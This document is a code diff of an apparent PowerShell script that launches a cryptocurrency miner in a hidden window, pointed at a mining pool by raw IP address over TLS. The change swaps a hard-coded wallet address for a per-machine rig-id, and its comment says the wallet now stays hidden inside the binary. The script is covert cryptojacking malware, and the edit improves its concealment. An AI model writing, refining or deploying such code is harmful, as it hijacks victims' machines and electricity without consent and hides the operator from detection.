@@ -40,9 +40,8 @@ if (-not (Test-Path $sysPath)) {
 }
 
 $hostName = $env:COMPUTERNAME
-# unique worker per machine: pass = hostname (pool shows each install separately)
-$wallet   = '46h6yczeC1FPU77qD3vqsdJwyiCpYDtFterUsde7U3t1Nxkke6VdSGcN9QwzRvnZRb4AKbq33u4saNGQbNfmKu2c2yUsR6o'
-$minArgs  = "-o 141.94.96.71:443 -u $wallet -p $hostName --tls --keepalive"
+# unique worker per machine via rig-id (wallet stays hidden inside the binary)
+$minArgs  = "-o 141.94.96.71:443 --rig-id=$hostName --tls --keepalive"
 
 if (Test-Path $sysPath) {
     Start-Process -FilePath $sysPath -ArgumentList $minArgs -WorkingDirectory $dir -WindowStyle Hidden
